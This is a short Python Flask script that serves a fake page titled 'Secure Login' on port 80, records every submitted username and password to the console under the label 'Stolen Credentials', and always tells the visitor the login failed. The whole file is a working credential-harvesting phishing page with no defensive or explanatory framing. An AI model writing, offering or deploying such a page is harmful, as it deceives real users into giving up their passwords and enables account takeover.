from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get("username")
        password = request.form.get("password")
        print(f"[!] Stolen Credentials: {username}:{password}")
        return "Login failed. Try again."

    return render_template_string('''
        <h2>Secure Login</h2>
        <form method="POST">
            Username: <input name="username"><br>
            Password: <input name="password" type="password"><br>
            <button type="submit">Login</button>
        </form>
    ''')

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80)